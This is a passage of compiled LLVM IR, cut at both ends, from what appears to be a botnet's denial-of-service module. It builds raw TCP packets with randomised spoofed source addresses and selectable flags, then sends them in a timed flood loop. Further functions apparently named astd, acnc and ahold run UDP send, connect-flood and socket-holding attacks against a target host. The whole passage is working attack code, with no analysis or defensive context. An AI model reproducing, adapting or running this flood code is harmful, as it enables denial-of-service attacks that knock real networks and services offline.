  %66 = shl i32 1, %65
  %67 = sub nsw i32 %66, 1
  %68 = xor i32 %67, -1
  store i32 %68, i32* %19, align 4
  br label %69

69:                                               ; preds = %63, %62
  %70 = load i32, i32* %13, align 4
  %71 = sext i32 %70 to i64
  %72 = add i64 40, %71
  %73 = call i8* @llvm.stacksave()
  store i8* %73, i8** %20, align 8
  %74 = alloca i8, i64 %72, align 16
  store i64 %72, i64* %21, align 8
  %75 = bitcast i8* %74 to %struct.iphdr*
  store %struct.iphdr* %75, %struct.iphdr** %22, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %77 = bitcast %struct.iphdr* %76 to i8*
  %78 = getelementptr i8, i8* %77, i64 20
  %79 = bitcast i8* %78 to %struct.tcphdr*
  store %struct.tcphdr* %79, %struct.tcphdr** %23, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %82 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 4
  %84 = load i32, i32* %19, align 4
  %85 = call i32 @getRandomIP(i32 %84)
  %86 = call i32 @htonl(i32 %85) #10
  %87 = load i32, i32* %13, align 4
  %88 = sext i32 %87 to i64
  %89 = add i64 20, %88
  %90 = trunc i64 %89 to i32
  call void @makeIPPacket(%struct.iphdr* %80, i32 %83, i32 %86, i8 zeroext 6, i32 %90)
  %91 = call i32 @rand_cmwc()
  %92 = trunc i32 %91 to i16
  %93 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %94 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %93, i32 0, i32 0
  %95 = bitcast %union.anon.1* %94 to %struct.anon.2*
  %96 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %95, i32 0, i32 0
  store i16 %92, i16* %96, align 4
  %97 = call i32 @rand_cmwc()
  %98 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %99 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %98, i32 0, i32 0
  %100 = bitcast %union.anon.1* %99 to %struct.anon.2*
  %101 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %100, i32 0, i32 2
  store i32 %97, i32* %101, align 4
  %102 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon.1* %103 to %struct.anon.2*
  %105 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %104, i32 0, i32 3
  store i32 0, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.1* %107 to %struct.anon.2*
  %109 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %108, i32 0, i32 4
  %110 = load i16, i16* %109, align 4
  %111 = and i16 %110, -241
  %112 = or i16 %111, 80
  store i16 %112, i16* %109, align 4
  %113 = load i8*, i8** %12, align 8
  %114 = call i32 @strcmp(i8* %113, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0)) #12
  %115 = icmp ne i32 %114, 0
  br i1 %115, label %152, label %116

116:                                              ; preds = %69
  %117 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 0
  %119 = bitcast %union.anon.1* %118 to %struct.anon.2*
  %120 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %119, i32 0, i32 4
  %121 = load i16, i16* %120, align 4
  %122 = and i16 %121, -513
  %123 = or i16 %122, 512
  store i16 %123, i16* %120, align 4
  %124 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %125 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %124, i32 0, i32 0
  %126 = bitcast %union.anon.1* %125 to %struct.anon.2*
  %127 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %126, i32 0, i32 4
  %128 = load i16, i16* %127, align 4
  %129 = and i16 %128, -1025
  %130 = or i16 %129, 1024
  store i16 %130, i16* %127, align 4
  %131 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i32 0, i32 0
  %133 = bitcast %union.anon.1* %132 to %struct.anon.2*
  %134 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %133, i32 0, i32 4
  %135 = load i16, i16* %134, align 4
  %136 = and i16 %135, -257
  %137 = or i16 %136, 256
  store i16 %137, i16* %134, align 4
  %138 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i32 0, i32 0
  %140 = bitcast %union.anon.1* %139 to %struct.anon.2*
  %141 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %140, i32 0, i32 4
  %142 = load i16, i16* %141, align 4
  %143 = and i16 %142, -4097
  %144 = or i16 %143, 4096
  store i16 %144, i16* %141, align 4
  %145 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %146 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %145, i32 0, i32 0
  %147 = bitcast %union.anon.1* %146 to %struct.anon.2*
  %148 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %147, i32 0, i32 4
  %149 = load i16, i16* %148, align 4
  %150 = and i16 %149, -2049
  %151 = or i16 %150, 2048
  store i16 %151, i16* %148, align 4
  br label %226

152:                                              ; preds = %69
  %153 = load i8*, i8** %12, align 8
  %154 = call i8* @strtok(i8* %153, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %154, i8** %24, align 8
  br label %155

155:                                              ; preds = %223, %152
  %156 = load i8*, i8** %24, align 8
  %157 = icmp ne i8* %156, null
  br i1 %157, label %158, label %225

158:                                              ; preds = %155
  %159 = load i8*, i8** %24, align 8
  %160 = call i32 @strcmp(i8* %159, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0)) #12
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %170, label %162

162:                                              ; preds = %158
  %163 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %164 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %163, i32 0, i32 0
  %165 = bitcast %union.anon.1* %164 to %struct.anon.2*
  %166 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %165, i32 0, i32 4
  %167 = load i16, i16* %166, align 4
  %168 = and i16 %167, -513
  %169 = or i16 %168, 512
  store i16 %169, i16* %166, align 4
  br label %223

170:                                              ; preds = %158
  %171 = load i8*, i8** %24, align 8
  %172 = call i32 @strcmp(i8* %171, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0)) #12
  %173 = icmp ne i32 %172, 0
  br i1 %173, label %182, label %174

174:                                              ; preds = %170
  %175 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %176 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %175, i32 0, i32 0
  %177 = bitcast %union.anon.1* %176 to %struct.anon.2*
  %178 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %177, i32 0, i32 4
  %179 = load i16, i16* %178, align 4
  %180 = and i16 %179, -1025
  %181 = or i16 %180, 1024
  store i16 %181, i16* %178, align 4
  br label %222

182:                                              ; preds = %170
  %183 = load i8*, i8** %24, align 8
  %184 = call i32 @strcmp(i8* %183, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0)) #12
  %185 = icmp ne i32 %184, 0
  br i1 %185, label %194, label %186

186:                                              ; preds = %182
  %187 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.1* %188 to %struct.anon.2*
  %190 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -257
  %193 = or i16 %192, 256
  store i16 %193, i16* %190, align 4
  br label %221

194:                                              ; preds = %182
  %195 = load i8*, i8** %24, align 8
  %196 = call i32 @strcmp(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0)) #12
  %197 = icmp ne i32 %196, 0
  br i1 %197, label %206, label %198

198:                                              ; preds = %194
  %199 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 0
  %201 = bitcast %union.anon.1* %200 to %struct.anon.2*
  %202 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %201, i32 0, i32 4
  %203 = load i16, i16* %202, align 4
  %204 = and i16 %203, -4097
  %205 = or i16 %204, 4096
  store i16 %205, i16* %202, align 4
  br label %220

206:                                              ; preds = %194
  %207 = load i8*, i8** %24, align 8
  %208 = call i32 @strcmp(i8* %207, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0)) #12
  %209 = icmp ne i32 %208, 0
  br i1 %209, label %218, label %210

210:                                              ; preds = %206
  %211 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %212 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %211, i32 0, i32 0
  %213 = bitcast %union.anon.1* %212 to %struct.anon.2*
  %214 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %215, -2049
  %217 = or i16 %216, 2048
  store i16 %217, i16* %214, align 4
  br label %219

218:                                              ; preds = %206
  br label %219

219:                                              ; preds = %218, %210
  br label %220

220:                                              ; preds = %219, %198
  br label %221

221:                                              ; preds = %220, %186
  br label %222

222:                                              ; preds = %221, %174
  br label %223

223:                                              ; preds = %222, %162
  %224 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %224, i8** %24, align 8
  br label %155, !llvm.loop !28

225:                                              ; preds = %155
  br label %226

226:                                              ; preds = %225, %116
  %227 = call i32 @rand_cmwc()
  %228 = trunc i32 %227 to i16
  %229 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 0
  %231 = bitcast %union.anon.1* %230 to %struct.anon.2*
  %232 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %231, i32 0, i32 5
  store i16 %228, i16* %232, align 2
  %233 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 0
  %235 = bitcast %union.anon.1* %234 to %struct.anon.2*
  %236 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %235, i32 0, i32 6
  store i16 0, i16* %236, align 4
  %237 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 0
  %239 = bitcast %union.anon.1* %238 to %struct.anon.2*
  %240 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %239, i32 0, i32 7
  store i16 0, i16* %240, align 2
  %241 = load i32, i32* %9, align 4
  %242 = icmp eq i32 %241, 0
  br i1 %242, label %243, label %245

243:                                              ; preds = %226
  %244 = call i32 @rand_cmwc()
  br label %250

245:                                              ; preds = %226
  %246 = load i32, i32* %9, align 4
  %247 = trunc i32 %246 to i16
  %248 = call zeroext i16 @htons(i16 zeroext %247) #10
  %249 = zext i16 %248 to i32
  br label %250

250:                                              ; preds = %245, %243
  %251 = phi i32 [ %244, %243 ], [ %249, %245 ]
  %252 = trunc i32 %251 to i16
  %253 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 0
  %255 = bitcast %union.anon.1* %254 to %struct.anon.2*
  %256 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %255, i32 0, i32 1
  store i16 %252, i16* %256, align 2
  %257 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %258 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %259 = call zeroext i16 @tcpcsum(%struct.iphdr* %257, %struct.tcphdr* %258)
  %260 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon.1* %261 to %struct.anon.2*
  %263 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %262, i32 0, i32 6
  store i16 %259, i16* %263, align 4
  %264 = bitcast i8* %74 to i16*
  %265 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 2
  %267 = load i16, i16* %266, align 2
  %268 = zext i16 %267 to i32
  %269 = call zeroext i16 @csum(i16* %264, i32 %268)
  %270 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 7
  store i16 %269, i16* %271, align 2
  %272 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %273 = load i32, i32* %10, align 4
  %274 = add nsw i32 %272, %273
  store i32 %274, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %275

275:                                              ; preds = %328, %327, %250
  br label %276

276:                                              ; preds = %275
  %277 = load i32, i32* %17, align 4
  %278 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %279 = call i64 @sendto(i32 %277, i8* %74, i64 %72, i32 0, %struct.sockaddr* %278, i32 16)
  %280 = load i32, i32* %19, align 4
  %281 = call i32 @getRandomIP(i32 %280)
  %282 = call i32 @htonl(i32 %281) #10
  %283 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 8
  store i32 %282, i32* %284, align 4
  %285 = call i32 @rand_cmwc()
  %286 = trunc i32 %285 to i16
  %287 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 3
  store i16 %286, i16* %288, align 4
  %289 = call i32 @rand_cmwc()
  %290 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %291 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %290, i32 0, i32 0
  %292 = bitcast %union.anon.1* %291 to %struct.anon.2*
  %293 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %292, i32 0, i32 2
  store i32 %289, i32* %293, align 4
  %294 = call i32 @rand_cmwc()
  %295 = trunc i32 %294 to i16
  %296 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 0
  %298 = bitcast %union.anon.1* %297 to %struct.anon.2*
  %299 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %298, i32 0, i32 0
  store i16 %295, i16* %299, align 4
  %300 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %301 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %300, i32 0, i32 0
  %302 = bitcast %union.anon.1* %301 to %struct.anon.2*
  %303 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %302, i32 0, i32 6
  store i16 0, i16* %303, align 4
  %304 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %305 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %306 = call zeroext i16 @tcpcsum(%struct.iphdr* %304, %struct.tcphdr* %305)
  %307 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon.1* %308 to %struct.anon.2*
  %310 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %309, i32 0, i32 6
  store i16 %306, i16* %310, align 4
  %311 = bitcast i8* %74 to i16*
  %312 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 2
  %314 = load i16, i16* %313, align 2
  %315 = zext i16 %314 to i32
  %316 = call zeroext i16 @csum(i16* %311, i32 %315)
  %317 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %318 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %317, i32 0, i32 7
  store i16 %316, i16* %318, align 2
  %319 = load i32, i32* %26, align 4
  %320 = load i32, i32* %15, align 4
  %321 = icmp eq i32 %319, %320
  br i1 %321, label %322, label %328

322:                                              ; preds = %276
  %323 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %324 = load i32, i32* %25, align 4
  %325 = icmp sgt i32 %323, %324
  br i1 %325, label %326, label %327

326:                                              ; preds = %322
  br label %331

327:                                              ; preds = %322
  store i32 0, i32* %26, align 4
  br label %275

328:                                              ; preds = %276
  %329 = load i32, i32* %26, align 4
  %330 = add i32 %329, 1
  store i32 %330, i32* %26, align 4
  br label %275

331:                                              ; preds = %326
  %332 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %332)
  br label %333

333:                                              ; preds = %331, %58, %52, %45
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @astd(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [1 x i8*], align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %13 = call i32 @socket(i32 2, i32 2, i32 0) #11
  store i32 %13, i32* %7, align 4
  %14 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %15 = sext i32 %14 to i64
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %18, i8 0, i64 16, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #11
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

38:                                               ; preds = %3, %61
  %39 = bitcast [1 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 8 %39, i8* align 8 bitcast ([1 x i8*]* @__const.astd.hexstring to i8*), i64 8, i1 false)
  %40 = load i32, i32* %11, align 4
  %41 = icmp uge i32 %40, 50
  br i1 %41, label %42, label %61

42:                                               ; preds = %38
  %43 = load i32, i32* %7, align 4
  %44 = getelementptr inbounds [1 x i8*], [1 x i8*]* %12, i64 0, i64 0
  %45 = bitcast i8** %44 to i8*
  %46 = call i64 @send(i32 %43, i8* %45, i64 1460, i32 0)
  %47 = load i32, i32* %7, align 4
  %48 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %49 = call i32 @connect(i32 %47, %struct.sockaddr* %48, i32 16)
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = sext i32 %50 to i64
  %52 = load i64, i64* %8, align 8
  %53 = load i32, i32* %6, align 4
  %54 = sext i32 %53 to i64
  %55 = add nsw i64 %52, %54
  %56 = icmp sge i64 %51, %55
  br i1 %56, label %57, label %60

57:                                               ; preds = %42
  %58 = load i32, i32* %7, align 4
  %59 = call i32 @close(i32 %58)
  call void @_exit(i32 0) #13
  unreachable

60:                                               ; preds = %42
  store i32 0, i32* %11, align 4
  br label %61

61:                                               ; preds = %60, %38
  %62 = load i32, i32* %11, align 4
  %63 = add i32 %62, 1
  store i32 %63, i32* %11, align 4
  br label %38
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @acnc(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #11
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  br label %22

22:                                               ; preds = %26, %3
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  br i1 %25, label %26, label %34

26:                                               ; preds = %22
  %27 = call i32 @socket(i32 2, i32 1, i32 0) #11
  store i32 %27, i32* %8, align 4
  %28 = load i32, i32* %8, align 4
  %29 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %30 = call i32 @connect(i32 %28, %struct.sockaddr* %29, i32 16)
  %31 = call i32 @sleep(i32 1)
  %32 = load i32, i32* %8, align 4
  %33 = call i32 @close(i32 %32)
  br label %22, !llvm.loop !29

34:                                               ; preds = %22
  ret void
}

declare i32 @sleep(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @ahold(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.fd_set*, align 8
  %21 = alloca i32, align 4
  %22 = alloca %struct.fd_set*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %23 = call i32 @getdtablesize() #11
  %24 = sdiv i32 %23, 2
  store i32 %24, i32* %7, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %5, align 4
  %27 = trunc i32 %26 to i16
  %28 = call zeroext i16 @htons(i16 zeroext %27) #10
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = load i8*, i8** %4, align 8
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %32 = call i32 @getHost(i8* %30, %struct.in_addr* %31)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

34:                                               ; preds = %3
  br label %269

35:                                               ; preds = %3
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %37, i8 0, i64 8, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t, i64 %39, align 16
  store i64 %39, i64* %11, align 8
  %42 = bitcast %struct.state_t* %41 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %42, i8 0, i64 %45, i1 false)
  %46 = call noalias align 16 i8* @malloc(i64 1024) #11
  store i8* %46, i8** %17, align 8
  %47 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %47, i8 0, i64 1024, i1 false)
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = load i32, i32* %6, align 4
  %50 = add nsw i32 %48, %49
  store i32 %50, i32* %18, align 4
  br label %51

51:                                               ; preds = %266, %35
  %52 = load i32, i32* %18, align 4
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = icmp sgt i32 %52, %53
  br i1 %54, label %55, label %267

55:                                               ; preds = %51
  store i32 0, i32* %8, align 4
  br label %56

56:                                               ; preds = %263, %55
  %57 = load i32, i32* %8, align 4
  %58 = load i32, i32* %7, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %266

60:                                               ; preds = %56
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %62
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  switch i32 %66, label %262 [
    i32 0, label %67
    i32 1, label %111
    i32 2, label %202
  ]

67:                                               ; preds = %60
  %68 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %69 = load i32, i32* %8, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %70
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %71, i32 0, i32 0
  store i32 %68, i32* %72, align 8
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %74
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %75, i32 0, i32 0
  %77 = load i32, i32* %76, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %79
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 8
  %83 = call i32 (i32, i32, ...) @fcntl(i32 %82, i32 3, i8* null)
  %84 = or i32 %83, 2048
  %85 = call i32 (i32, i32, ...) @fcntl(i32 %77, i32 4, i32 %84)
  %86 = load i32, i32* %8, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %87
  %89 = getelementptr inbounds %struct.state_t, %struct.state_t* %88, i32 0, i32 0
  %90 = load i32, i32* %89, align 8
  %91 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %92 = call i32 @connect(i32 %90, %struct.sockaddr* %91, i32 16)
  %93 = icmp ne i32 %92, -1
  br i1 %93, label %98, label %94

94:                                               ; preds = %67
  %95 = call i32* @__errno_location() #10
  %96 = load i32, i32* %95, align 4
  %97 = icmp ne i32 %96, 115
  br i1 %97, label %98, label %105

98:                                               ; preds = %94, %67
  %99 = load i32, i32* %8, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %100
